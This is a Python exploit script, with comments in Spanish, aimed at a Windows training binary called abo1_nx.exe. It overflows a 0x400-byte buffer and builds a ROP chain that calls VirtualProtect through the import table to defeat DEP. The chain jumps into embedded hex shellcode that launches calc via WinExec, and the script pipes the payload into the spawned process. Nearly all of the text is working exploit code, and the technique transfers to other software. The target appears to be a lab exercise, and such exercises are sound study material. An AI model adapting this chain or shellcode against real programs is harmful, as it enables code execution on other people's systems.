import sys
import binascii
from subprocess import Popen, PIPE

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

#Entradas para el primer Gets
buff = b"A" * 0x400
base_pointer = b"B" * 4
ret1 =  b"\xAE\xE5\x40\x00" # POP EDX / RETN
ret2 =  b"\x46\x8D\x40\x00" # POP ECX / POP EDI / POP EBX / POP ESI / POP EBP / RETN         

# ARGUMENTOS PARA VIRTUALPROTECT
arg_flNewProtect =  b"\x40\x00\x00\x00"                                                      # REGISTRO EDX: 0x40
arg_lpflOldProtect = b"\x55\xAB\x41\x00" # Puntero escribible                                # REGISTRO ECX: 0041ab55
ptroToRet = b"\x4B\x8D\x40\x00"                                                              # REGISTRO EDI: 00408D4B
arg_dwSize = b"\x01\x00\x00\x00"                                                             # REGISTRO EBX: 00000001
ptro_iat_virtualprotect = b"\x00\x20\x41\x00"                                                # REGISTRO ESI: 00412000
ptro_jmpesp = b"\xC1\xF7\x00\x78"  # PUSH ESP # RETN                                         # REGISTRO EBP: 7800F7C1

rop = ret1 + arg_flNewProtect + ret2 + arg_lpflOldProtect + ptroToRet + arg_dwSize + ptro_iat_virtualprotect + ptro_jmpesp
rop +=  b"\xDB\x6D\x40\x00"  # MOV EAX,ESI # POP ESI # RETN
rop +=  b"A" * 4             # Basura          
rop +=  b"\x9A\x23\x01\x78"  # MOV EAX,DWORD PTR DS:[EAX] # RETN # nsvcrt.dll
rop +=  b"\x81\xEB\x40\x00"  # MOV ESI,EAX # MOV EAX,ESI # POP ESI # POP EBP # RETN
rop +=  b"A" * 4             # Basura 
rop +=  ptro_jmpesp    
rop +=  b"\xAB\x9A\x00\x78"  # PUSH EAX # ADD AL,5F # POP ESI # RETN # nsvcrt.dll    
rop +=  b"\x06\x9A\x00\x78"  # POP EAX # RETN
rop +=  b"\x90\x90\x90\x90"   
rop +=  b"\x91\x97\x00\x78"  # PUSHAD # ADD,AL # RETN
rop +=  winexec_calc_shellcode

# Armando el Payload
payload = buff + base_pointer + rop      #

p1 = Popen("abo1_nx.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()